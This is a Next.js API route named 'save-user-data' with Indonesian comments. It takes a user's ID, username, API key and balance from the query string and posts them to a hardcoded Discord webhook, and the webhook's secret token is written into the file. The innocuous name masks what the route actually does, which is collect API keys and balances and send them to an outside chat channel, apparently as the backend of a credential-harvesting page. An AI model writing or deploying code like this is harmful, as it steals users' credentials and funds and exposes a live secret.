// pages/api/save-user-data.ts

import { NextApiRequest, NextApiResponse } from 'next';

const webhookUrl =
  'https://discord.com/api/webhooks/1327936072986001490/vTZiNo3Zox04Piz7woTFdYLw4b2hFNriTDn68QlEeBvAjnxtXy05GNaopBjcGhIj0i1C';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  try {
    const { id, username, apiKey, balance } = req.query;

    if (!id || !username || !apiKey) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Format pesan embed untuk Discord
    const embed = {
      username: 'Webhook Bot', // Nama pengirim webhook
      embeds: [
        {
          title: 'New User Data Saved',
          color: 5814783, // Warna embed (opsional)
          fields: [
            { name: 'ID', value: String(id), inline: true },
            { name: 'Username', value: String(username), inline: true },
            { name: 'API Key', value: String(apiKey), inline: false },
            { name: 'Balance', value: balance ? String(balance) : '0', inline: true },
          ],
          timestamp: new Date().toISOString(), // Tambahkan waktu saat ini
        },
      ],
    };

    // Kirim embed ke webhook Discord
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Failed to send webhook:', errorText);
      return res.status(500).json({ error: 'Failed to send webhook' });
    }

    res.status(200).json({ message: 'User data sent to webhook successfully' });
  } catch (error) {
    console.error('Error processing request:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
}
